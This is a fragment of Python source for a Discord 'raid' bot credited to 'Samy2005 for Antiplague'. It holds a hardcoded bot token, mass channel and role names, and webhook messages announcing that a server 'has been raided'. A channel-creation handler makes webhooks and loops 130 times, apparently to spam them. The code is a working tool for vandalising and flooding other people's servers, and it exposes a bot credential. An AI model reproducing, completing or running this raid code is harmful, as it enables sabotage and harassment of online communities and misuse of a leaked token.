...
token = ("OTkyODkwMzU4ODk3ODQ0MzE1.GB_1bE.LKUVGSFUXSAmXZqqAA38kTOKgd5LJwPnJhAsSQ")
prefix = (".")
channel_names = ("Antiplague x Yung Samy", "Antiplague x Yung Samy")
role_names = ("Antiplague x Yung Samy", "Antiplague x Yung Samy")
webhook_users = ("Antiplague x Yung Samy", "Antiplague x Yung Samy")
webhook_contents = ("@everyone **Your server has been raided by Antiplague x Yung Samy, clown!**  https://discord.gg/ZdsVA2m8bV , https://imgur.com/zDbMzvu", "@everyone **Your server has been raided by Antiplague, clown!**  https://discord.gg/ZdsVA2m8bV , https://imgur.com/zDbMzvu")
...
def menu():
	...
	logging.info(f"\033[0;49;93mBy Samy2005 for Antiplague")
...
async def on_guild_channel_create(channel):
	try:
		webhook = await channel.create_webhook(name="Antiplague x Yung Samy")
		for i in range(130):
